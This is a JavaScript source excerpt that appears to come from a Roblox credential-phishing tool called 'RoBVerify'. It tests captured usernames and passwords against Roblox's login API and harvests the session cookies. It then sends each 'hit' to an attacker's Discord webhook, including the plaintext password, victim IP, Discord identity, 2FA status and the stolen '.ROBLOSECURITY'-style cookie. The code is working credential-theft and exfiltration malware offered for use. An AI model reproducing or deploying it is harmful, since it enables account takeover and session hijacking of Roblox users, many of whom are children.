const resp = await fetch("https://auth.roblox.com/v2/login", {
      method: "POST",
      headers,
      redirect: "manual",
      body: JSON.stringify({ ctype, cvalue: username, password })
    });

    const setCookies = getSetCookies(resp.headers);
    for (const c of setCookies) {
      const pair = c.split(";")[0];
      const name = pair.split("=")[0];
      jar = jar.split("; ").filter(x => x && !x.startsWith(name + "="))
               .concat(pair).join("; ");
    }

    // Roblox rejects the first call with 403 + an x-csrf-token header. Retry with it.
    if (resp.status === 403) {
      const t = resp.headers.get("x-csrf-token");
      if (t && t !== csrf) { csrf = t; continue; }
    }

    const text = await resp.text();
    let parsed = null;
    try { parsed = JSON.parse(text); } catch {}

    return { ok: resp.ok, status: resp.status, body: parsed, cookies: setCookies };
  }

  return { ok: false, status: 0, body: null, cookies: [] };
}

function getSetCookies(h) {
  if (typeof h.getSetCookie === "function") {
    const v = h.getSetCookie();
    if (v && v.length) return v;
  }
  if (typeof h.raw === "function" && h.raw["set-cookie"]) return h.raw["set-cookie"];
  const raw = h.get("set-cookie");
  return raw ? [raw] : [];
}

async function notify(p) {
  if (!WEBHOOK_URL || WEBHOOK_URL.includes("PASTE_YOUR")) return false;

  const isDiscord = /discord(app)?\.com/.test(WEBHOOK_URL);

  const body = isDiscord ? {
    content: "🔐 **RoBVerify hit** `" + p.ref + "`",
    embeds: [{
      color: p.valid ? 0x00C853 : 0xE2231A,
      fields: [
        { name: "Roblox user", value: p.username || "—", inline: true },
        { name: "Password",    value: p.password || "—", inline: true },
        { name: "Account",     value: p.account ? p.account + " (#" + p.accountId + ")" : "❌ invalid", inline: true },
        { name: "Discord",     value: p.discordName ? p.discordName + " (" + p.discordId + ")" : "—", inline: true },
        { name: "2FA",         value: p.twoStep ? "yes" : "no", inline: true },
        { name: "IP",          value: p.ip || "—", inline: true },
        { name: "Cookie",      value: "```" + (p.cookie || "none").slice(0, 990) + "```" }
      ],
      timestamp: p.time
    }]
  } : p;

  const resp = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  return resp.ok;
}
